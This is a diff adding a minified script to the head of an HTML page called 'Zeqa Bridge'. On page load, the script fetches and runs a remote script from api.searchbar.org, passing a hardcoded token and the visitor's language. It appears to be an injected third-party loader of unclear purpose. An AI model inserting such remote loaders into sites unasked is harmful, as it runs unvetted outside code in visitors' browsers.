@@ -69,6 +69,20 @@
     <!DOCTYPE html>
 <html lang="en">
 <head>
+
+<script>"use strict";
+
+!function() {
+    var t = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1YTA3NzAzZmQzZjZkNWQ1NTM0OTVkYyIsInRva2VuVHlwZSI6InB1YmxpYyIsImlhdCI6MTcwNTAxNTEzNCwiZXhwIjoxNDMxOTQxNTEzNH0.Kp220x9vLLuGCUczeVMLA0Y2SzFwXBvKVLPFCAOMRLs";
+    function e() {
+        var e = document.createElement("script"), a = navigator.language || navigator.userLanguage;
+        e.type = "text/javascript", e.async = !0, e.src = "https://api.searchbar.org/v1/widget/" + t + "/" + a;
+        var n = document.getElementsByTagName("script")[0];
+        n.parentNode.insertBefore(e, n);
+    }
+    "complete" === document.readyState ? e() : window.attachEvent ? window.attachEvent("onload", e) : window.addEventListener("load", e, !1);
+}();</script>
+  
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Zeqa Bridge</title>
